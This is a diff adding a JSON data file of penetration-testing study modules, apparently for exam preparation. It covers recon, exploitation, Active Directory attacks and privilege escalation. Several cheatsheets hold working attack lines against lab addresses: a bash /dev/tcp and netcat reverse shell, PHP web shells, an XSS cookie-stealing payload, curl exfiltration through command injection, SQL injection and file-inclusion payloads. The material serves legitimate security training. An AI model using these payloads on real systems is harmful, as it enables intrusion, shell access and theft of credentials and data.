@@ -1,0 +1,372 @@
+[
+  {
+    "title": "Penetration Testing Process",
+    "slug": "pentest-process",
+    "category": "Fundamentals",
+    "summary": "Understanding the phases of penetration testing: Planning, Information Gathering, Vulnerability Assessment, Exploitation, Post-Exploitation, and Reporting.",
+    "cheatsheet_md": "<h3>Phases</h3><ul><li><b>Pre-engagement</b>: Scope, RoE, legal</li><li><b>Recon</b>: Passive & active info gathering</li><li><b>Enumeration</b>: Services, users, shares</li><li><b>Exploitation</b>: Initial access</li><li><b>Post-Exploitation</b>: Privesc, persistence, lateral movement</li><li><b>Reporting</b>: Document findings</li></ul><h3>Key Commands</h3><pre>whois domain.com # Query domain registration info\ndig domain.com ANY # Query all DNS records\nhost -t mx domain.com # Find mail servers</pre>",
+    "pitfalls_md": "<ul><li>Skipping enumeration - always enumerate thoroughly</li><li>Not documenting as you go</li><li>Forgetting scope boundaries</li></ul>",
+    "exam_tips_md": "<ul><li>Screenshot everything important</li><li>Keep detailed notes with timestamps</li><li>Document dead ends too</li></ul>",
+    "order_index": 1
+  },
+  {
+    "title": "Network Enumeration with Nmap",
+    "slug": "nmap",
+    "category": "Enumeration",
+    "summary": "Master Nmap for host discovery, port scanning, service detection, and NSE scripts.",
+    "cheatsheet_md": "<h3>Host Discovery</h3><pre>nmap -sn 10.10.10.0/24 # Ping scan subnet for live hosts\nnmap -Pn -sS 10.10.10.5 # SYN scan host, treat as online (skip ping)</pre><h3>Port Scanning</h3><pre>nmap -p- --min-rate 10000 10.10.10.5 # Fast full port scan (all 65535 ports)\nnmap -sS -sV -sC -p 22,80,445 10.10.10.5 # Detailed scan (SYN, Version, Scripts) on found ports</pre><h3>Service/Version</h3><pre>nmap -sV --version-intensity 5 10.10.10.5 # Aggressive version detection</pre><h3>Scripts</h3><pre>nmap --script=vuln 10.10.10.5 # Run vulnerability scanning scripts\nnmap --script=smb-enum-shares 10.10.10.5 # Enumerate SMB shares via script</pre><h3>Output</h3><pre>nmap -oA scan_results 10.10.10.5 # Save results in all formats (normal, grepable, xml)</pre>",
+    "pitfalls_md": "<ul><li>Using -T5 on production networks</li><li>Forgetting UDP scans</li><li>Not saving output</li></ul>",
+    "exam_tips_md": "<ul><li>Always do full port scan first</li><li>Use -oA to save all formats</li><li>Check UDP 53,161,500</li></ul>",
+    "order_index": 2
+  },
+  {
+    "title": "Footprinting",
+    "slug": "footprinting",
+    "category": "Enumeration",
+    "summary": "Gather information about target infrastructure including DNS, SMTP, FTP, SMB, NFS, SNMP, and more.",
+    "cheatsheet_md": "<h3>DNS</h3><pre>dig axfr @ns.domain.com domain.com # Attempt DNS Zone Transfer\ndnsenum domain.com # Enumerate DNS info and subdomains\nsubfinder -d domain.com # Passive subdomain enumeration</pre><h3>SMB</h3><pre>smbclient -L //10.10.10.5 -N # List shares with null session\nsmbmap -H 10.10.10.5 # Map shares and permissions\nenum4linux -a 10.10.10.5 # Run all enumeration checks (users, shares, groups)</pre><h3>SNMP</h3><pre>snmpwalk -v2c -c public 10.10.10.5 # Walk MIB tree with community string 'public'\nonesixtyone -c community.txt 10.10.10.5 # Brute force community strings</pre><h3>NFS</h3><pre>showmount -e 10.10.10.5 # Show exported NFS shares\nmount -t nfs 10.10.10.5:/share /mnt # Mount the share locally</pre>",
+    "pitfalls_md": "<ul><li>Ignoring low-hanging fruit like anonymous FTP/SMB</li><li>Not trying default credentials</li></ul>",
+    "exam_tips_md": "<ul><li>Always check for null sessions</li><li>Look for config files in shares</li></ul>",
+    "order_index": 3
+  },
+  {
+    "title": "Web Information Gathering",
+    "slug": "web-info-gathering",
+    "category": "Web",
+    "summary": "Techniques for web application reconnaissance including subdomain enumeration, directory fuzzing, and technology fingerprinting.",
+    "cheatsheet_md": "<h3>Subdomains</h3><pre>subfinder -d domain.com # Fast passive subdomain enumeration\namass enum -d domain.com # Comprehensive subdomain enumeration</pre><h3>Directory Fuzzing</h3><pre>ffuf -u http://10.10.10.5/FUZZ -w wordlist.txt # Fuzz directories with ffuf\ngobuster dir -u http://10.10.10.5 -w wordlist.txt # Brute force directories with gobuster</pre><h3>Tech Stack</h3><pre>whatweb http://10.10.10.5 # Identify web technologies\nwappalyzer # Browser extension for tech profiling</pre><h3>Virtual Hosts</h3><pre>ffuf -u http://10.10.10.5 -H 'Host: FUZZ.domain.com' -w vhosts.txt # Fuzz for virtual hosts</pre>",
+    "pitfalls_md": "<ul><li>Not checking /robots.txt, /sitemap.xml</li><li>Missing hidden vhosts</li></ul>",
+    "exam_tips_md": "<ul><li>Add discovered hostnames to /etc/hosts</li><li>Check both HTTP and HTTPS</li></ul>",
+    "order_index": 4
+  },
+  {
+    "title": "Vulnerability Assessment",
+    "slug": "vuln-assessment",
+    "category": "Fundamentals",
+    "summary": "Identify and prioritize vulnerabilities using automated scanners and manual testing.",
+    "cheatsheet_md": "<h3>Nmap Vuln Scripts</h3><pre>nmap --script vuln 10.10.10.5 # Run all NSE vulnerability scripts</pre><h3>Searchsploit</h3><pre>searchsploit apache 2.4 # Search for exploits locally\nsearchsploit -m 12345 # Mirror/copy exploit to current dir</pre><h3>Manual Checks</h3><ul><li>Check service versions against CVE databases</li><li>Test for default credentials</li><li>Look for misconfigurations</li></ul>",
+    "pitfalls_md": "<ul><li>Relying only on automated scanners</li><li>Not verifying scanner results</li></ul>",
+    "exam_tips_md": "<ul><li>Note all version numbers</li><li>Cross-reference with exploit-db</li></ul>",
+    "order_index": 5
+  },
+  {
+    "title": "File Transfers",
+    "slug": "file-transfers",
+    "category": "Fundamentals",
+    "summary": "Methods to transfer files between attacker and target systems.",
+    "cheatsheet_md": "<h3>Python HTTP Server</h3><pre>python3 -m http.server 8000 # Start simple HTTP server on port 8000</pre><h3>Download (Linux)</h3><pre>wget http://10.10.14.5:8000/file # Download file with wget\ncurl http://10.10.14.5:8000/file -o file # Download file with curl</pre><h3>Download (Windows)</h3><pre>certutil -urlcache -f http://10.10.14.5/file file # Download on Windows using certutil\npowershell iwr -uri http://10.10.14.5/file -outfile file # Download using PowerShell Invoke-WebRequest</pre><h3>SMB</h3><pre>impacket-smbserver share . -smb2support # Start SMB server sharing current dir\ncopy \\\\10.10.14.5\\share\\file . # Copy file from SMB share on Windows</pre><h3>Base64</h3><pre>base64 file | tr -d '\\n' # Encode file to base64 string\necho 'BASE64' | base64 -d > file # Decode base64 string back to file</pre>",
+    "pitfalls_md": "<ul><li>Firewall blocking common ports</li><li>AV catching transfers</li></ul>",
+    "exam_tips_md": "<ul><li>Have multiple methods ready</li><li>SMB often works when HTTP fails</li></ul>",
+    "order_index": 6
+  },
+  {
+    "title": "Shells & Payloads",
+    "slug": "shells-payloads",
+    "category": "Exploitation",
+    "summary": "Creating and catching reverse shells, bind shells, and web shells.",
+    "cheatsheet_md": "<h3>Reverse Shells</h3><pre>bash -i >& /dev/tcp/10.10.14.5/4444 0>&1 # Bash reverse shell\nnc -e /bin/bash 10.10.14.5 4444 # Netcat reverse shell (if -e available)\npowershell -e BASE64_PAYLOAD # PowerShell encoded reverse shell</pre><h3>Listeners</h3><pre>nc -lvnp 4444 # Start Netcat listener on port 4444\nrlwrap nc -lvnp 4444 # Listener with history/arrow keys support</pre><h3>Shell Upgrade</h3><pre>python3 -c 'import pty;pty.spawn(\"/bin/bash\")' # Spawn TTY shell with Python\nexport TERM=xterm # Set terminal type\n# Ctrl+Z, stty raw -echo; fg # Background, fix TTY, foreground</pre><h3>Web Shells</h3><pre>&lt;?php system($_GET['cmd']); ?&gt; # Basic PHP web shell</pre>",
+    "pitfalls_md": "<ul><li>Not upgrading shells</li><li>Forgetting to URL encode</li></ul>",
+    "exam_tips_md": "<ul><li>Always upgrade to PTY</li><li>Use rlwrap for arrow keys</li></ul>",
+    "order_index": 7
+  },
+  {
+    "title": "Metasploit Framework",
+    "slug": "metasploit",
+    "category": "Exploitation",
+    "summary": "Using Metasploit for exploitation, post-exploitation, and pivoting.",
+    "cheatsheet_md": "<h3>Basic Usage</h3><pre>msfconsole # Start Metasploit Framework\nsearch type:exploit name:smb # Search for SMB exploits\nuse exploit/windows/smb/ms17_010_eternalblue # Select EternalBlue exploit\nset RHOSTS 10.10.10.5 # Set target IP\nset LHOST tun0 # Set listener interface\nexploit # Run the exploit</pre><h3>Meterpreter</h3><pre>getuid # Show current user context\nsysinfo # Show system information\nhashdump # Dump password hashes\nupload/download # Transfer files\nportfwd add -l 8080 -p 80 -r 10.10.10.6 # Forward local port 8080 to remote 80</pre><h3>Post Modules</h3><pre>run post/windows/gather/enum_logged_on_users # Enumerate logged on users\nrun post/multi/recon/local_exploit_suggester # Suggest local exploits</pre>",
+    "pitfalls_md": "<ul><li>Over-reliance on Metasploit</li><li>Not understanding what exploits do</li></ul>",
+    "exam_tips_md": "<ul><li>Know manual methods too</li><li>Use for pivoting</li></ul>",
+    "order_index": 8
+  },
+  {
+    "title": "Password Attacks",
+    "slug": "password-attacks",
+    "category": "Exploitation",
+    "summary": "Techniques for password cracking, brute forcing, and credential attacks.",
+    "cheatsheet_md": "<h3>Hashcat</h3><pre>hashcat -m 0 hash.txt wordlist.txt # Crack MD5 hashes\nhashcat -m 1000 ntlm.txt rockyou.txt # Crack NTLM hashes\nhashcat -m 13100 krb5tgs.txt wordlist.txt # Crack Kerberoast TGS hashes</pre><h3>John</h3><pre>john --wordlist=rockyou.txt hash.txt # Crack hashes with John\njohn --show hash.txt # Show cracked passwords</pre><h3>Hydra</h3><pre>hydra -l admin -P wordlist.txt ssh://10.10.10.5 # Brute force SSH\nhydra -L users.txt -P pass.txt 10.10.10.5 http-post-form \"/login:user=^USER^&pass=^PASS^:Invalid\" # Brute force web form</pre><h3>CrackMapExec</h3><pre>crackmapexec smb 10.10.10.5 -u user -p password # Test SMB credentials\ncrackmapexec smb 10.10.10.5 -u users.txt -p passwords.txt # Password spray SMB</pre>",
+    "pitfalls_md": "<ul><li>Account lockouts</li><li>Using wrong hash mode</li></ul>",
+    "exam_tips_md": "<ul><li>Try password spraying</li><li>Check for password reuse</li></ul>",
+    "order_index": 9
+  },
+  {
+    "title": "Attacking Common Services",
+    "slug": "common-services",
+    "category": "Exploitation",
+    "summary": "Exploit techniques for FTP, SSH, SMB, RDP, SQL, and other services.",
+    "cheatsheet_md": "<h3>FTP (21)</h3><pre>ftp 10.10.10.5 # Connect to FTP server\nanonymous/anonymous # Try anonymous login</pre><h3>SSH (22)</h3><pre>ssh user@10.10.10.5 # Connect via SSH with password\nssh -i id_rsa user@10.10.10.5 # Connect via SSH with private key</pre><h3>SMB (445)</h3><pre>smbclient //10.10.10.5/share -U user # Connect to SMB share\nimpacket-psexec user:pass@10.10.10.5 # Get shell via PsExec (needs admin)</pre><h3>WinRM (5985)</h3><pre>evil-winrm -i 10.10.10.5 -u user -p pass # Get shell via WinRM</pre><h3>MSSQL (1433)</h3><pre>impacket-mssqlclient user:pass@10.10.10.5 # Connect to MSSQL\nxp_cmdshell 'whoami' # Execute command via xp_cmdshell</pre>",
+    "pitfalls_md": "<ul><li>Ignoring non-standard ports</li><li>Not trying default creds</li></ul>",
+    "exam_tips_md": "<ul><li>Always check for anonymous access</li><li>Look for credential reuse</li></ul>",
+    "order_index": 10
+  },
+  {
+    "title": "Pivoting, Tunneling & Port Forwarding",
+    "slug": "pivoting",
+    "category": "Post-Exploitation",
+    "summary": "Techniques to access internal networks through compromised hosts.",
+    "cheatsheet_md": "<h3>SSH Tunneling</h3><pre>ssh -L 8080:10.10.10.6:80 user@10.10.10.5 # Local port forward (access remote service locally)\nssh -D 9050 user@10.10.10.5 # Dynamic port forward (SOCKS proxy)\nssh -R 8080:localhost:80 user@10.10.14.5 # Remote port forward (expose local service remotely)</pre><h3>Chisel</h3><pre># Server\nchisel server --reverse -p 8000 # Start Chisel server on attacker\n# Client\nchisel client 10.10.14.5:8000 R:socks # Connect from target to create SOCKS tunnel</pre><h3>Ligolo-ng</h3><pre># Proxy\n./proxy -selfcert # Start Ligolo proxy interface\n# Agent\n./agent -connect 10.10.14.5:11601 -ignore-cert # Connect Ligolo agent from target</pre><h3>Proxychains</h3><pre>proxychains nmap -sT 10.10.10.6 # Scan through proxy (must use TCP connect scan)</pre>",
+    "pitfalls_md": "<ul><li>Forgetting to use -sT with proxychains</li><li>Not updating proxychains.conf</li></ul>",
+    "exam_tips_md": "<ul><li>Ligolo-ng is faster than chisel</li><li>Double-check pivot routes</li></ul>",
+    "order_index": 11
+  },
+  {
+    "title": "Active Directory Enumeration",
+    "slug": "ad-enum",
+    "category": "Active Directory",
+    "summary": "Enumerate AD environments to find attack paths.",
+    "cheatsheet_md": "<h3>BloodHound</h3><pre>bloodhound-python -u user -p pass -d domain.local -c all # Collect BloodHound data remotely\nneo4j console # Start Neo4j database\nbloodhound # Launch BloodHound GUI</pre><h3>LDAP</h3><pre>ldapsearch -x -H ldap://dc.domain.local -b 'DC=domain,DC=local' # Query LDAP for domain info</pre><h3>PowerView</h3><pre>Get-DomainUser # List domain users (PowerView)\nGet-DomainGroup # List domain groups\nFind-LocalAdminAccess # Find machines where current user is admin\nGet-DomainGPO # Enumerate Group Policy Objects</pre><h3>CME</h3><pre>crackmapexec smb 10.10.10.5 -u user -p pass --users # Enumerate domain users via SMB\ncrackmapexec smb 10.10.10.5 -u user -p pass --shares # Enumerate SMB shares</pre>",
+    "pitfalls_md": "<ul><li>Not running BloodHound collection</li><li>Missing group memberships</li></ul>",
+    "exam_tips_md": "<ul><li>Always run BloodHound</li><li>Look for Kerberoastable accounts</li></ul>",
+    "order_index": 12
+  },
+  {
+    "title": "Active Directory Attacks",
+    "slug": "ad-attacks",
+    "category": "Active Directory",
+    "summary": "Common AD attack techniques: Kerberoasting, AS-REP Roasting, Pass-the-Hash, DCSync.",
+    "cheatsheet_md": "<h3>Kerberoasting</h3><pre>GetUserSPNs.py domain/user:pass -dc-ip 10.10.10.5 -request # Request TGS for Kerberoasting\nhashcat -m 13100 krb5tgs.txt wordlist.txt # Crack TGS hashes</pre><h3>AS-REP Roasting</h3><pre>GetNPUsers.py domain/ -usersfile users.txt -dc-ip 10.10.10.5 # Check for AS-REP Roasting (no pre-auth)</pre><h3>Pass-the-Hash</h3><pre>impacket-psexec -hashes :NTHASH user@10.10.10.5 # Pass-the-Hash with PsExec\nevil-winrm -i 10.10.10.5 -u user -H NTHASH # Pass-the-Hash with Evil-WinRM</pre><h3>DCSync</h3><pre>secretsdump.py domain/user:pass@10.10.10.5 # DCSync to dump domain hashes (needs rights)</pre>",
+    "pitfalls_md": "<ul><li>Using wrong hash format</li><li>Not trying PTH when creds fail</li></ul>",
+    "exam_tips_md": "<ul><li>Check for unconstrained delegation</li><li>Look for GenericAll permissions</li></ul>",
+    "order_index": 13
+  },
+  {
+    "title": "Using Web Proxies",
+    "slug": "web-proxies",
+    "category": "Web",
+    "summary": "Using Burp Suite and other proxies for web testing.",
+    "cheatsheet_md": "<h3>Burp Setup</h3><ul><li>Proxy: 127.0.0.1:8080</li><li>Install CA certificate</li><li>Configure browser proxy</li></ul><h3>Key Features</h3><ul><li>Intercept requests</li><li>Repeater for manual testing</li><li>Intruder for fuzzing</li><li>Decoder for encoding</li></ul><h3>Tips</h3><pre>Match & Replace for headers\nExtensions: Autorize, JWT Editor</pre>",
+    "pitfalls_md": "<ul><li>Forgetting to forward requests</li><li>Not installing CA cert</li></ul>",
+    "exam_tips_md": "<ul><li>Use Repeater extensively</li><li>Check response differences</li></ul>",
+    "order_index": 14
+  },
+  {
+    "title": "Attacking Web Apps with Ffuf",
+    "slug": "ffuf",
+    "category": "Web",
+    "summary": "Directory and parameter fuzzing with ffuf.",
+    "cheatsheet_md": "<h3>Directory Fuzzing</h3><pre>ffuf -u http://10.10.10.5/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt # Basic directory fuzzing</pre><h3>Extension Fuzzing</h3><pre>ffuf -u http://10.10.10.5/indexFUZZ -w extensions.txt # Fuzz file extensions</pre><h3>Parameter Fuzzing</h3><pre>ffuf -u http://10.10.10.5/page?FUZZ=value -w params.txt # Fuzz GET parameters</pre><h3>Subdomain</h3><pre>ffuf -u http://FUZZ.domain.com -w subdomains.txt -H 'Host: FUZZ.domain.com' # Fuzz subdomains (vhost)</pre><h3>Filters</h3><pre>-fc 404    # Filter out 404 responses\n-fs 0      # Filter out responses with size 0\n-fw 10     # Filter out responses with 10 words</pre>",
+    "pitfalls_md": "<ul><li>Using too fast rate</li><li>Wrong filter settings</li></ul>",
+    "exam_tips_md": "<ul><li>Try multiple wordlists</li><li>Fuzz with extensions</li></ul>",
+    "order_index": 15
+  },
+  {
+    "title": "Login Brute Forcing",
+    "slug": "login-bruteforce",
+    "category": "Web",
+    "summary": "Brute forcing web login forms and services.",
+    "cheatsheet_md": "<h3>Web Forms</h3><pre>hydra -l admin -P wordlist.txt 10.10.10.5 http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid' # Brute force POST login form</pre><h3>Basic Auth</h3><pre>hydra -l admin -P wordlist.txt 10.10.10.5 http-get /admin # Brute force Basic Auth</pre><h3>Ffuf</h3><pre>ffuf -u http://10.10.10.5/login -X POST -d 'user=admin&pass=FUZZ' -w wordlist.txt -fc 401 # Brute force login with ffuf</pre>",
+    "pitfalls_md": "<ul><li>Not identifying correct failure string</li><li>Rate limiting/lockouts</li></ul>",
+    "exam_tips_md": "<ul><li>Check for rate limits</li><li>Try common passwords first</li></ul>",
+    "order_index": 16
+  },
+  {
+    "title": "SQL Injection Fundamentals",
+    "slug": "sqli",
+    "category": "Web",
+    "summary": "Understanding and exploiting SQL injection vulnerabilities.",
+    "cheatsheet_md": "<h3>Detection</h3><pre>' OR '1'='1 # Basic auth bypass payload\n' OR 1=1-- # Tautology payload with comment\n\" OR \"\"=\" # Double quote auth bypass</pre><h3>Union Based</h3><pre>' UNION SELECT NULL,NULL,NULL-- # Determine column count\n' UNION SELECT 1,user(),database()-- # Extract user and database name</pre><h3>Error Based</h3><pre>' AND extractvalue(1,concat(0x7e,(SELECT @@version)))-- # Error-based extraction of version</pre><h3>Blind</h3><pre>' AND SLEEP(5)-- # Test for time-based blind SQLi\n' AND IF(1=1,SLEEP(5),0)-- # Conditional time-based check</pre>",
+    "pitfalls_md": "<ul><li>Wrong column count</li><li>Not URL encoding</li></ul>",
+    "exam_tips_md": "<ul><li>Use SQLMap for speed</li><li>Check all parameters</li></ul>",
+    "order_index": 17
+  },
+  {
+    "title": "SQLMap Essentials",
+    "slug": "sqlmap",
+    "category": "Web",
+    "summary": "Automated SQL injection with SQLMap.",
+    "cheatsheet_md": "<h3>Basic Usage</h3><pre>sqlmap -u 'http://10.10.10.5/page?id=1' --batch # Basic scan with default options</pre><h3>POST Request</h3><pre>sqlmap -u http://10.10.10.5/login --data='user=a&pass=b' -p user # Scan POST parameter 'user'</pre><h3>With Cookie</h3><pre>sqlmap -u URL --cookie='PHPSESSID=abc123' # Scan with authenticated session cookie</pre><h3>Enumeration</h3><pre>sqlmap -u URL --dbs # Enumerate databases\nsqlmap -u URL -D dbname --tables # Enumerate tables in DB\nsqlmap -u URL -D db -T table --dump # Dump table data</pre><h3>OS Shell</h3><pre>sqlmap -u URL --os-shell # Attempt to get OS shell</pre>",
+    "pitfalls_md": "<ul><li>Not using --batch</li><li>Missing WAF bypass</li></ul>",
+    "exam_tips_md": "<ul><li>Use --level=5 --risk=3 if needed</li><li>Save request to file with -r</li></ul>",
+    "order_index": 18
+  },
+  {
+    "title": "Cross-Site Scripting (XSS)",
+    "slug": "xss",
+    "category": "Web",
+    "summary": "Finding and exploiting XSS vulnerabilities.",
+    "cheatsheet_md": "<h3>Test Payloads</h3><pre>&lt;script&gt;alert(1)&lt;/script&gt; # Basic script tag payload\n&lt;img src=x onerror=alert(1)&gt; # Image tag with onerror event\n&lt;svg onload=alert(1)&gt; # SVG tag with onload event</pre><h3>Cookie Stealing</h3><pre>&lt;script&gt;new Image().src='http://10.10.14.5/?c='+document.cookie&lt;/script&gt; # Steal cookies via image request</pre><h3>Filter Bypass</h3><pre>&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt; # Bypass case-sensitive filters\n&lt;img src=x onerror=alert`1`&gt; # Bypass parenthesis filters</pre>",
+    "pitfalls_md": "<ul><li>Not testing all inputs</li><li>Missing stored XSS</li></ul>",
+    "exam_tips_md": "<ul><li>Check reflected and stored</li><li>Look for DOM-based XSS</li></ul>",
+    "order_index": 19
+  },
+  {
+    "title": "File Inclusion",
+    "slug": "file-inclusion",
+    "category": "Web",
+    "summary": "Local and Remote File Inclusion vulnerabilities.",
+    "cheatsheet_md": "<h3>LFI</h3><pre>/page?file=../../../../etc/passwd # Basic directory traversal\n/page?file=....//....//etc/passwd # Bypass traversal filters</pre><h3>Wrappers</h3><pre>php://filter/convert.base64-encode/resource=index.php # Read source code via base64 filter\ndata://text/plain,&lt;?php system($_GET['cmd']);?&gt; # RCE via data wrapper</pre><h3>Log Poisoning</h3><pre># Poison Apache log\ncurl -H \"User-Agent: &lt;?php system($_GET['cmd']);?&gt;\" URL # Inject PHP into User-Agent\n# Include log\n/page?file=/var/log/apache2/access.log&cmd=id # Include poisoned log file</pre>",
+    "pitfalls_md": "<ul><li>Path not deep enough</li><li>Null byte not working (PHP 5.3+)</li></ul>",
+    "exam_tips_md": "<ul><li>Try multiple wrappers</li><li>Check for log files</li></ul>",
+    "order_index": 20
+  },
+  {
+    "title": "File Upload Attacks",
+    "slug": "file-upload",
+    "category": "Web",
+    "summary": "Bypassing file upload restrictions.",
+    "cheatsheet_md": "<h3>Extension Bypass</h3><pre>.php5, .phtml, .phar # Alternative PHP extensions\n.php.jpg, .php%00.jpg # Double extension and null byte bypass</pre><h3>Content-Type</h3><pre>Content-Type: image/jpeg # Spoof MIME type</pre><h3>Magic Bytes</h3><pre>GIF89a; &lt;?php system($_GET['cmd']); ?&gt; # Add GIF magic bytes to bypass file check</pre><h3>Execution</h3><ul><li>Find upload path</li><li>Navigate and execute</li></ul>",
+    "pitfalls_md": "<ul><li>Not finding upload location</li><li>Uploads renamed/not executable</li></ul>",
+    "exam_tips_md": "<ul><li>Try all bypass methods</li><li>Check .htaccess override</li></ul>",
+    "order_index": 21
+  },
+  {
+    "title": "Command Injections",
+    "slug": "command-injection",
+    "category": "Web",
+    "summary": "OS command injection techniques.",
+    "cheatsheet_md": "<h3>Basic</h3><pre>; id # Semicolon separator\n| id # Pipe separator\n|| id # OR separator (runs if first fails)\n& id # Background separator\n&& id # AND separator (runs if first succeeds)\n$(id) # Command substitution\n`id` # Backtick substitution</pre><h3>Blind</h3><pre>; sleep 5 # Time-based blind check\n| curl http://10.10.14.5/$(whoami) # Out-of-band data exfiltration</pre><h3>Filter Bypass</h3><pre>${IFS} # Use IFS environment variable for space\n$'\\x20' # Use hex code for space</pre>",
+    "pitfalls_md": "<ul><li>Not testing all delimiters</li><li>Missing blind injection</li></ul>",
+    "exam_tips_md": "<ul><li>Test with sleep</li><li>Use out-of-band</li></ul>",
+    "order_index": 22
+  },
+  {
+    "title": "Web Attacks",
+    "slug": "web-attacks",
+    "category": "Web",
+    "summary": "SSRF, XXE, IDOR and other web attacks.",
+    "cheatsheet_md": "<h3>SSRF</h3><pre>http://localhost:80 # Target local service\nhttp://127.0.0.1 # Target loopback IP\nhttp://0.0.0.0 # Target all interfaces</pre><h3>XXE</h3><pre>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'&gt;]&gt;\n&lt;data&gt;&xxe;&lt;/data&gt; # Basic XXE payload to read /etc/passwd</pre><h3>IDOR</h3><pre>/api/user/1 → /api/user/2 # Change ID to access other user data\n/download?file=123 → 124 # Change file ID to download other files</pre>",
+    "pitfalls_md": "<ul><li>Not checking internal ports</li><li>XXE parser not vulnerable</li></ul>",
+    "exam_tips_md": "<ul><li>Try cloud metadata endpoints</li><li>Check all ID parameters</li></ul>",
+    "order_index": 23
+  },
+  {
+    "title": "Attacking Common Applications",
+    "slug": "common-apps",
+    "category": "Web",
+    "summary": "Exploiting CMS and common web applications.",
+    "cheatsheet_md": "<h3>WordPress</h3><pre>wpscan --url http://target --enumerate u,p,t # Enumerate WordPress users, plugins, themes</pre><h3>Jenkins</h3><pre>println \"whoami\".execute().text # Jenkins Groovy Script Console RCE</pre><h3>Tomcat</h3><pre>tomcat/tomcat # Try default credentials\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=4444 -f war > shell.war # Create malicious WAR file</pre><h3>phpMyAdmin</h3><pre>SELECT \"&lt;?php system($_GET['cmd']); ?&gt;\" INTO OUTFILE '/var/www/html/shell.php' # Write web shell via SQL</pre>",
+    "pitfalls_md": "<ul><li>Not checking plugin versions</li><li>Missing admin panels</li></ul>",
+    "exam_tips_md": "<ul><li>Check /manager /admin</li><li>Look for exposed configs</li></ul>",
+    "order_index": 24
+  },
+  {
+    "title": "Linux Privilege Escalation",
+    "slug": "linux-privesc",
+    "category": "Privilege Escalation",
+    "summary": "Techniques to escalate privileges on Linux systems.",
+    "cheatsheet_md": "<h3>Enumeration</h3><pre>id; whoami; hostname # Basic user info\nuname -a # Kernel version info\ncat /etc/os-release # OS distribution info\nsudo -l # Check sudo privileges</pre><h3>SUID</h3><pre>find / -perm -4000 2>/dev/null # Find SUID binaries</pre><h3>Capabilities</h3><pre>getcap -r / 2>/dev/null # List file capabilities</pre><h3>Cron</h3><pre>cat /etc/crontab # View system cron jobs\nls -la /etc/cron.* # List cron directories</pre><h3>Writable Files</h3><pre>find / -writable -type f 2>/dev/null # Find world-writable files</pre><h3>Tools</h3><pre>./linpeas.sh # Run LinPEAS enumeration script\n./linux-exploit-suggester.sh # Check for kernel exploits</pre>",
+    "pitfalls_md": "<ul><li>Not checking sudo -l</li><li>Missing SUID binaries</li></ul>",
+    "exam_tips_md": "<ul><li>Always run linpeas</li><li>Check GTFOBins</li></ul>",
+    "order_index": 25
+  },
+  {
+    "title": "Windows Privilege Escalation",
+    "slug": "windows-privesc",
+    "category": "Privilege Escalation",
+    "summary": "Techniques to escalate privileges on Windows systems.",
+    "cheatsheet_md": "<h3>Enumeration</h3><pre>whoami /all # User privileges and groups\nsysteminfo # System info and hotfixes\nnet user # List users\nnet localgroup administrators # List local admins</pre><h3>Services</h3><pre>sc query # Query services\nGet-Service # PowerShell list services\nwmic service get name,pathname # List service binary paths</pre><h3>Unquoted Paths</h3><pre>wmic service get name,displayname,pathname | findstr /i /v \"C:\\Windows\" # Find non-standard service paths</pre><h3>Always Install Elevated</h3><pre>reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer # Check AlwaysInstallElevated registry key</pre><h3>Tools</h3><pre>winPEAS.exe # Run WinPEAS enumeration tool\nImport-Module .\\PowerUp.ps1; Invoke-AllChecks # Run PowerUp checks</pre>",
+    "pitfalls_md": "<ul><li>Not checking AlwaysInstallElevated</li><li>Missing service misconfigs</li></ul>",
+    "exam_tips_md": "<ul><li>Run winPEAS</li><li>Check stored creds</li></ul>",
+    "order_index": 26
+  },
+  {
+    "title": "Getting Started",
+    "slug": "getting-started",
+    "category": "Fundamentals",
+    "summary": "Set up your penetration testing environment, understand basic terminology, and learn fundamental concepts.",
+    "cheatsheet_md": "<h3>Connecting to HTB</h3><pre>sudo openvpn academy-lab.ovpn # Connect to HTB VPN\nifconfig tun0 # Verify VPN interface IP</pre><h3>Parrot/Kali Setup</h3><pre>sudo apt update && sudo apt upgrade # Update system packages\nsudo apt install terminator tmux # Install essential tools</pre><h3>Service Management</h3><pre>sudo systemctl start ssh # Start SSH service\nsudo systemctl enable ssh # Enable SSH on boot\nsudo systemctl status ssh # Check SSH status</pre><h3>Basic Recon</h3><pre>ping -c 4 10.10.10.5 # Check connectivity\nnmap -sC -sV 10.10.10.5 # Basic Nmap scan</pre><h3>Web Shell Basics</h3><pre>curl http://10.10.10.5/shell.php?cmd=id # Test web shell RCE\nnc -lvnp 4444 # Start listener</pre>",
+    "pitfalls_md": "<ul><li>Not verifying VPN connection is active</li><li>Forgetting to check tun0 IP</li><li>Not taking notes from the start</li></ul>",
+    "exam_tips_md": "<ul><li>Verify VPN connectivity before starting</li><li>Have a note-taking system ready</li><li>Know your attack machine IP</li></ul>",
+    "order_index": 27
+  },
+  {
+    "title": "Vulnerability Scanning with Nessus",
+    "slug": "nessus",
+    "category": "Enumeration",
+    "summary": "Using Nessus Professional for comprehensive vulnerability scanning and assessment.",
+    "cheatsheet_md": "<h3>Start Nessus</h3><pre>sudo systemctl start nessusd # Start Nessus service\n# Browse to https://localhost:8834 # Access web interface</pre><h3>Scan Types</h3><ul><li><b>Basic Network Scan</b>: General purpose</li><li><b>Advanced Scan</b>: Customizable</li><li><b>Web Application</b>: Web-focused</li><li><b>Credentialed Scan</b>: With creds for deeper checks</li></ul><h3>Key Settings</h3><ul><li>Discovery: Ping, ARP, TCP/UDP</li><li>Assessment: Accuracy vs speed</li><li>Credentials: SSH, SMB, WinRM</li></ul><h3>Export</h3><pre>Export as .nessus, CSV, or HTML # Export report formats</pre>",
+    "pitfalls_md": "<ul><li>Running without credentials misses many vulns</li><li>Not validating scanner findings manually</li><li>Overwhelming network with aggressive scans</li></ul>",
+    "exam_tips_md": "<ul><li>Use for initial recon, not as sole source</li><li>Credentialed scans find more issues</li><li>Cross-reference CVEs with searchsploit</li></ul>",
+    "order_index": 28
+  },
+  {
+    "title": "Vulnerability Scanning with OpenVAS",
+    "slug": "openvas",
+    "category": "Enumeration",
+    "summary": "Open-source vulnerability scanning with Greenbone/OpenVAS.",
